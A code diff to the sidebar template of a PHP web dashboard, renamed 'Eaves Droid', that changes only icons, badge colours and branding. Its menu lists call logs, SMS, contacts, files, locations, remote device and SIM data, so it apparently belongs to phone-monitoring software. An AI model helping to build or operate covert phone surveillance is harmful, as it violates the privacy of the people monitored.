@@ -126,8 +126,8 @@
         <aside class="main-sidebar sidebar-dark-primary elevation-4">
             <!-- Brand Logo -->
             <a href="<?php echo base_url('home'); ?>" class="brand-link">
-                <img src="<?= base_url('assets/img/logo.png') ?>" alt="Prj Images Logo" class="brand-image img-circle elevation-3" style="opacity: .8">
-                <span class="brand-text font-weight-light">Prj Images</span>
+                <img src="<?= base_url('assets/img/logo.png') ?>" alt="Eaves Droid Logo" class="brand-image img-circle elevation-3" style="opacity: .8">
+                <span class="brand-text font-weight-light">Eaves Droid</span>
             </a>
 
             <!-- Sidebar -->
@@ -164,16 +164,16 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('apps'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'apps') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-th nav-icon"></i>
                                         <p>Apps</p>
-                                        <span class="badge badge-info float-right"><?php echo isset($total_apps) ? $total_apps : 0; ?></span>
+                                        <span class="badge badge-success float-right"><?php echo isset($total_apps) ? $total_apps : 0; ?></span>
                                     </a>
                                 </li>
 
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('call_logs'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'call_logs') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-phone nav-icon"></i>
                                         <p>Call Logs</p>
                                         <span class="badge badge-success float-right"><?php echo isset($total_calls) ? $total_calls : 0; ?></span>
                                     </a>
@@ -182,50 +182,49 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('contacts'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'contacts') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-address-book nav-icon"></i>
                                         <p>Contacts</p>
-                                        <span class="badge badge-warning float-right"><?php echo isset($total_contacts) ? $total_contacts : 0; ?></span>
+                                        <span class="badge badge-success float-right"><?php echo isset($total_contacts) ? $total_contacts : 0; ?></span>
                                     </a>
                                 </li>
 
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('sms'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'sms') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-comment-dots nav-icon"></i>
                                         <p>SMS</p>
-                                        <span class="badge badge-danger float-right"><?php echo isset($total_sms) ? $total_sms : 0; ?></span>
+                                        <span class="badge badge-success float-right"><?php echo isset($total_sms) ? $total_sms : 0; ?></span>
                                     </a>
                                 </li>
 
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('files'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'files') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-folder nav-icon"></i>
                                         <p>Files</p>
-                                        <span class="badge badge-secondary float-right"><?php echo isset($total_files) ? $total_files : 0; ?></span>
+                                        <span class="badge badge-success float-right"><?php echo isset($total_files) ? $total_files : 0; ?></span>
                                     </a>
                                 </li>
 
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('location'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'location') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-map-pin nav-icon"></i>
                                         <p>Locations</p>
-                                        <span class="badge badge-info float-right"><?php echo isset($total_locations) ? $total_locations : 0; ?></span>
+                                        <span class="badge badge-success float-right"><?php echo isset($total_locations) ? $total_locations : 0; ?></span>
                                     </a>
                                 </li>
 
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('activities'); ?>"
                                        class="nav-link <?php echo (isset($pag) && ($pag == 'activities' || $pag == 'activity')) ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-running nav-icon"></i>
                                         <p>Activities</p>
-                                        <span class="badge badge-primary float-right"><?php echo isset($total_activities) ? $total_activities : 0; ?></span>
+                                        <span class="badge badge-success float-right"><?php echo isset($total_activities) ? $total_activities : 0; ?></span>
                                     </a>
                                 </li>
 
                                 <?php 
-                                    // Calculate total metrics sum (excludes sim_configs — it has its own nav item)
                                     $adv_total = ($total_device ?? 0) + ($total_network ?? 0) + ($total_accounts ?? 0) + 
                                                  ($total_calendar ?? 0) + ($total_app_usage ?? 0) + ($total_notifications ?? 0) + 
                                                  ($total_bluetooth ?? 0) + ($total_sensors ?? 0) + ($total_media ?? 0);
@@ -233,27 +232,27 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('advanced/device'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'advanced') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-microchip nav-icon"></i>
                                         <p>
                                             Device Metrics
-                                            <span class="badge badge-warning float-right"><?php echo $adv_total; ?></span>
+                                            <span class="badge badge-success float-right"><?php echo $adv_total; ?></span>
                                         </p>
                                     </a>
                                 </li>
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('remote-device'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'remote_device') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-desktop nav-icon"></i>
                                         <p>Remote Device</p>
                                     </a>
                                 </li>
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('sim-configs'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'sim_configs') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-sim-card nav-icon"></i>
                                         <p>
                                             SIM Configs
-                                            <span class="badge badge-info float-right"><?php echo $total_sim_configs ?? 0; ?></span>
+                                            <span class="badge badge-success float-right"><?php echo $total_sim_configs ?? 0; ?></span>
                                         </p>
                                     </a>
                                 </li>
@@ -278,7 +277,7 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('analysis'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'analysis' && (!isset($sub_pag) || $sub_pag != 'timeline')) ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-chart-bar nav-icon"></i>
                                         <p>Analysis</p>
                                         <span class="badge badge-info float-right">AI</span>
                                     </a>
@@ -287,16 +286,16 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('analysis/timeline'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'timeline') || (isset($sub_pag) && $sub_pag == 'timeline') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-clock nav-icon"></i>
                                         <p>Timeline</p>
-                                        <span class="badge badge-success float-right">New</span>
+                                        <span class="badge badge-info float-right">New</span>
                                     </a>
                                 </li>
 
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('analysis/wellbeing'); ?>"
                                        class="nav-link <?php echo (isset($sub_pag) && $sub_pag == 'wellbeing') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-heartbeat nav-icon"></i>
                                         <p>Digital Wellbeing</p>
                                     </a>
                                 </li>
@@ -304,9 +303,9 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('analysis/anomalies'); ?>"
                                        class="nav-link <?php echo (isset($sub_pag) && $sub_pag == 'anomalies') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-exclamation-triangle nav-icon"></i>
                                         <p>Anomalies</p>
-                                        <span class="badge badge-warning float-right"><i class="fas fa-exclamation"></i></span>
+                                        <span class="badge badge-info float-right"><i class="fas fa-exclamation"></i></span>
                                     </a>
                                 </li>
                             </ul>
@@ -329,7 +328,7 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('account/profile'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'account_profile') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-user-circle nav-icon"></i>
                                         <p>Profile</p>
                                     </a>
                                 </li>
@@ -337,7 +336,7 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('account/setting'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'account_setting') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-cog nav-icon"></i>
                                         <p>Settings</p>
                                     </a>
                                 </li>
@@ -345,7 +344,7 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('account/devices'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'account_devices') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-mobile-alt nav-icon"></i>
                                         <p>Device</p>
                                     </a>
                                 </li>
@@ -353,7 +352,7 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('analysis/blocklist'); ?>"
                                        class="nav-link <?php echo (isset($sub_pag) && $sub_pag == 'blocklist') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-ban nav-icon"></i>
                                         <p>Blocklist</p>
                                     </a>
                                 </li>
@@ -361,7 +360,7 @@
                                 <li class="nav-item">
                                     <a href="<?php echo base_url('account/logs'); ?>"
                                        class="nav-link <?php echo (isset($pag) && $pag == 'account_logs') ? 'active' : ''; ?>">
-                                        <i class="far fa-circle nav-icon"></i>
+                                        <i class="fas fa-history nav-icon"></i>
                                         <p>Access Logs</p>
                                     </a>
                                 </li>
